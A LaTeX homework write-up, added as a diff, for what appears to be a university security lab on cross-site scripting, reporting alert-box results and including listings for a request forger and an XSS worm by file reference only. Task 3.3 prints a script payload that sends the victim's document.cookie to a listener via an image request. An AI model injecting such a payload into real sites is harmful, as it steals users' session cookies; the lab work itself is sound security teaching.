@@ -1,0 +1,38 @@
+\documentclass[12pt]{article}
+\usepackage[hmargin=30mm,vmargin=30mm]{geometry}
+\usepackage{graphicx}
+\usepackage{listings}
+\lstset{breaklines=true, language=Java, numbers=left, frame=shadowbox, basicstyle=\scriptsize}
+\begin{document}
+
+\title{CS4238 Homework 2}
+\author{Laurence Putra Franslay (U096833E)}
+\date{22th Oct 2012}
+\maketitle
+
+\section{Task 3.1}
+An alert box containing the text `XSS' pops up.\\
+
+\includegraphics[width=160mm]{task31.png}
+
+\section{Task 3.2}
+An alert box containing the contents of the cookie pops up.\\
+
+\includegraphics[width=160mm]{task32.png}
+
+\section{Task 3.3}
+The cookie information is all sent to the destination.
+
+\begin{lstlisting}
+<script>document.write('<img src=http://127.0.1.1:5555?c='+ document.cookie + '>');</script>
+\end{lstlisting}
+\includegraphics[width=160mm]{task33.png}
+
+\section{Task 3.4}
+\lstset{caption=spoof.java}
+\lstinputlisting{HTTPSimpleForge.java}
+
+\section{Task 3.5}
+\lstset{caption=XSS Worm}
+\lstinputlisting{js.html}
+\enddocument
